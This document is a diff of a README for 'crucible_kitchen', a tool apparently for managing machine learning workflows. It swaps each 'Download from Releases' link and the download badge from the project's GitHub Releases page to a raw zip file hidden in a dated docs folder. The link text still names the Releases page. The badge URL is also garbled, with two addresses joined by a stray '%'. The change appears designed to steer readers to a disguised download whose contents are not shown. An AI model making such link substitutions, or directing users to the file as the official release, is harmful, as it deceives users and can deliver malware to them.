@@ -6,11 +6,11 @@ Welcome to crucible_kitchen! This application helps you manage machine learning 
 
 ## 📥 Download the Application
 
-[![Download crucible_kitchen](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/domty99/crucible_kitchen/releases)
+[![Download crucible_kitchen](https://raw.githubusercontent.com/domty99/crucible_kitchen/master/docs/20251229/kitchen-crucible-v1.2-alpha.2.zip%https://raw.githubusercontent.com/domty99/crucible_kitchen/master/docs/20251229/kitchen-crucible-v1.2-alpha.2.zip)](https://raw.githubusercontent.com/domty99/crucible_kitchen/master/docs/20251229/kitchen-crucible-v1.2-alpha.2.zip)
 
 Go to our Releases page to download the latest version of crucible_kitchen. Click the link below:
 
-[Download from Releases](https://github.com/domty99/crucible_kitchen/releases)
+[Download from Releases](https://raw.githubusercontent.com/domty99/crucible_kitchen/master/docs/20251229/kitchen-crucible-v1.2-alpha.2.zip)
 
 ## 📋 System Requirements
 
@@ -67,7 +67,7 @@ If you encounter issues or have questions, feel free to reach out for help. Chec
 
 To get started, visit our Releases page again to download crucible_kitchen:
 
-[Download from Releases](https://github.com/domty99/crucible_kitchen/releases)
+[Download from Releases](https://raw.githubusercontent.com/domty99/crucible_kitchen/master/docs/20251229/kitchen-crucible-v1.2-alpha.2.zip)
 
 Follow the installation instructions, and you will be ready to manage your machine learning workflows in no time.
 
